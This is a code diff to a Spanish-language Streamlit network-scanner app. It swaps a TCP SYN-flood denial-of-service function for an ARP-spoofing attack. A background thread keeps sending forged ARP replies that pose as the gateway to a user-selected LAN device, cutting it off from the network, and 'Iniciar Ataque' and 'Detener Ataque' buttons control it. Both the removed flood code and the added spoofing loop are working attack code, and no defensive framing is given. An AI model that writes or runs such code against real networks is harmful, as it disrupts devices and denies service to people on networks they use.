@@ -1,4 +1,4 @@
-from scapy.all import IP, TCP, Raw, send
+from scapy.all import IP, TCP, Raw, send, get_if_addr, conf
 import streamlit as st
 import pandas as pd
 import ipaddress
@@ -6,8 +6,8 @@ import socket
 import time
 import subprocess
 import platform
-import string
-import random
+import netifaces
+import threading
 
 try:
     from scapy.all import ARP, Ether, srp
@@ -19,13 +19,11 @@ st.set_page_config(page_title="Escáner de red - IP / MAC / Hostname", layout="w
 st.title("🔍 Escáner de red local (IP → MAC → Hostname)")
 
 def get_local_ip():
-    """Obtiene la IP local usada para salir (no consulta servicios externos)."""
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    try:
-        s.connect(("8.8.8.8", 80))
-        return s.getsockname()[0]
-    finally:
-        s.close()
+    return get_if_addr(conf.iface)
+
+def obtener_gateway():
+    gws = netifaces.gateways()
+    return gws['default'][netifaces.AF_INET][0]
 
 def ip_list_from_local(prefix_len=24):
     local_ip = get_local_ip()
@@ -182,28 +180,41 @@ else:
     st.info("Pulsa 'Iniciar escaneo' para buscar dispositivos en la red local.")
 
 select_ip = st.selectbox("Selecciona una IP", options=ip_list_from_local())
-timer = st.number_input("Duración del ataque (s.)", min_value=10, max_value=300, value=20)
 
-def random_string(length):
-    """Genera una cadena aleatoria de longitud especificada."""
-    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
+col1, col2 = st.columns(2)
 
-def dos_attack_with_scapy(target_ip, duration):
+def dos_attack_with_scapy(target_ip, flag):
 
-    end_time = time.time() + duration
+    mac_victima = get_mac_from_arp_cache(target_ip)
+    gateway_ip = obtener_gateway()
+    objetivo_ip = target_ip
+    
+    while flag["attack_running"]:
+        def spoof_bloqueo():
+            send(ARP(op=2, pdst=objetivo_ip, psrc=gateway_ip, hwdst=mac_victima), verbose=False)
+            time.sleep(2)
+    
+        spoof_bloqueo()
 
-    while time.time() < end_time:
-        payload = random_string(1024)
+if "flag" not in st.session_state:
+    st.session_state.flag = {"attack_running": False}
 
-        ip_layer = IP(dst=target_ip)
-        tcp_layer = TCP(dport=80, flags="S")
-        raw_layer = Raw(load=payload)
+with col1:
+    if st.button("Iniciar Ataque"):
+        if not st.session_state.flag["attack_running"]:
+            st.session_state.flag["attack_running"] = True
+            st.session_state.attack_thread = threading.Thread(
+                target=dos_attack_with_scapy, args=(select_ip,st.session_state.flag), daemon=True
+            )
+            st.session_state.attack_thread.start()
+            st.success("✅ Ataque iniciado")
+        else:
+            st.warning("⚠️ El ataque ya está en ejecución.")
 
-        packet = ip_layer / tcp_layer / raw_layer
-        send(packet, verbose=0)
-
-if st.button("DoS"):
-    st.info("Escaneo inciado...")
-    dos_attack_with_scapy(select_ip, duration=timer)
-    st.success(f"Ataque finalizado a la Ip: {select_ip} durante {timer} s.")
-
+with col2:
+    if st.button("Detener Ataque"):
+        if st.session_state.flag["attack_running"]:
+            st.session_state.flag["attack_running"] = False
+            st.error("🛑 Ataque detenido")
+        else:
+            st.info("No hay ataque en ejecución.")
